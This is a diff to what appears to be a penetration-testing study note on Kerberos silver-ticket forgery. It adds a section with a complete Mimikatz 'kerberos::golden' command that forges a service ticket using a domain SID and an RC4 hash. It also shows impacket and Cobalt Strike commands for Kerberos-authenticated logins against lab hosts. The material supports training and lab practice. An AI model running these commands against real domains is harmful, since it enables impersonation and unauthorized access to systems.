@@ -45,7 +45,7 @@ Where:
 
 -   `/user` is the username to impersonate.
 -   `/domain` is the current domain name.
--   `/sid` is the current domain SID.
+-   `/sid` is the current domain SID. (We can easily obtain the SID of our current user with `whoami /user`)
 -   `/target` is the target machine.
 -   `/aes256` is the AES256 key for the target machine.
 -   `/ticket` is the filename to save the ticket as.
@@ -111,7 +111,7 @@ beacon> jump winrm64 srv-2 smb
 ```
 
 
-### Without CS
+### In Kali
 
 ^4540be
 
@@ -134,6 +134,18 @@ save the ticket as an environment variable:
 
 Log in with impacket:
 `impacket-smbclient -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass`
+
+### In Mimikatz
+
+```
+mimikatz # kerberos::purge
+Ticket(s) purge for current session is OK
+mimikatz # kerberos::list
+mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748290D87AA966C327 /ptt
+mimikatz # kerberos::list
+```
+
+
 ___
 
 ## Resources:
